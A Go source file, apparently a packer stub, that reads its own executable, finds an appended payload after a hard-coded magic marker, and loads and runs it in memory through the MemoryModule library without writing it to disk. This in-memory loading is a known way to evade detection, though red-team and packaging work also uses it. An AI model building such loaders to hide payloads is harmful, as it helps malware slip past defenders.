package main

/*
#cgo CFLAGS: -IMemoryModule
#cgo LDFLAGS: MemoryModule/build/MemoryModule.a
#include "MemoryModule/MemoryModule.h"
*/
import "C"

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"regexp"
	"unsafe"
)

func main() {
	// string used to delimit code boundry
	magic := "9BC5440033354F2EBEEED2E6083903390A39B15489892A199F86A17CFA0F55B8"

	// read in self
	imagePath, err := filepath.Abs(os.Args[0])
	if err != nil {
		log.Fatal(err)
	}

	selfBytes, err := ioutil.ReadFile(imagePath)
	if err != nil {
		panic(err)
	}

	// search image on disk for magic string
	re, err := regexp.Compile(magic)
	if err != nil {
		log.Fatal(err)
	}

	// get indexes and payload offset
	indexes := re.FindAllIndex(selfBytes, -1)
	payloadOffset := indexes[len(indexes)-1][1]

	// create and launch payload
	payload := selfBytes[payloadOffset:]

	// convert the args passed to this program into a C array of C strings
	var cArgs []*C.char
	for _, goString := range os.Args {
		cArgs = append(cArgs, C.CString(goString))
	}

	// load the reconstructed binary from memory
	handle := C.MemoryLoadLibraryEx(
		unsafe.Pointer(&payload[0]),               // void *data
		(C.size_t)(len(payload)),                  // size_t
		(*[0]byte)(C.MemoryDefaultAlloc),          // Alloc func ptr
		(*[0]byte)(C.MemoryDefaultFree),           // Free func ptr
		(*[0]byte)(C.MemoryDefaultLoadLibrary),    // loadLibrary func ptr
		(*[0]byte)(C.MemoryDefaultGetProcAddress), // getProcAddress func ptr
		(*[0]byte)(C.MemoryDefaultFreeLibrary),    // freeLibrary func ptr
		unsafe.Pointer(&cArgs[0]),                 // void *userdata
	)

	// execute payload
	res := C.MemoryCallEntryPoint(handle)
	fmt.Printf("Output: %v\n", res)

	// cleanup
	C.MemoryFreeLibrary(handle)

}
